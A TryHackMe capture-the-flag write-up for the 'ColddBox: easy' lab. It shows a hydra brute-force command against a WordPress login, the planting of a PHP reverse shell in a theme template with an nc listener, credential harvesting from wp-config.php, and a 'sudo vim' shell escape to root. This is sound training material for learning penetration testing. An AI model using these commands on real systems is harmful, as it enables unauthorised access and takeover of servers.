---
title: "TryHackMe - ColddBox: easy"
author: Nasrallah
description: ""
date: 2022-10-03 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, easy, hydra, bruteforce, sudo]
img_path: /assets/img/tryhackme/colddbox
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [ColddBox: easy](https://tryhackme.com/room/colddboxeasy) from [TryHackMe](https://tryhackme.com). We find a webserver running wordpress, we scan it with wpscan and find usernames that we user to brute force the login page and find a password. We easily get a reverse shell after that. Once we're in, we find a password in a config file giving access to a user that has the ability to run some programs as root, we exploit that to get elevated privileges.

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.238.77
Host is up (0.11s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: ColddBox | One more machine
|_http-generator: WordPress 4.1.31
```

We have port 80 open running an Apache web server  and wordpress 4.1.31.

## WPScan

Let's run `wpscan` and see what we can find.

```bash
wpscan --url http://10.10.238.77 -e vp,vt,u
```

 - -e: enumerate - vp: vulnerable plugins | vt: vulnerable themes | u: usernames
        
![](1.png)

The scan revealed 3 usernames, let's put them in a file and brute force the login for wordpress.

```bash
hydra -L usernames.lst -P /usr/share/wordlists/rockyou.txt 10.10.238.77 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username"

```

![](2.png)

We found the password of user `c0ldd`. Let's login.

![](3.png)

# **Foothold**

Following the steps described in this [article](https://www.hackingarticles.in/wordpress-reverse-shell/), let's get a reverse shell.

Go to `Appearance` -> `Editor` and select the 404 Template

Replace the php code with this [php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) and change the ip to your tun0 ip. Then click `Update File`. 

![](4.png)

Now setup a listener with `nc -lvnp 1234` and visit this page `http://{target_IP}/wp-content/themes/twentyfifteen/404.php`

![](5.png)

# **Privilege Escalation**

Let's check the `wp-config.php` file of wordpress since it usually hold some credentials.

![](6.png)

We found the password of `c0ldd`. Let's switch to that user with `su c0ldd`.

Let's check our privileges with `sudo -l`

```terminal
c0ldd@ColddBox-Easy:/var/www/html$ sudo -l
Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp
c0ldd@ColddBox-Easy:/var/www/html$ 

```

We can `vim`, `ftp` and `chmod` as root. Let's go check [GTFOBins](https://gtfobins.github.io/gtfobins).

### Vim

![](7.png)

### FTP

![](8.png)

### chmod

![](9.png)

Let's run the vim command and get root.

```bash
sudo vim -c ':!/bin/sh'
```

![](10.png)


---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

# References
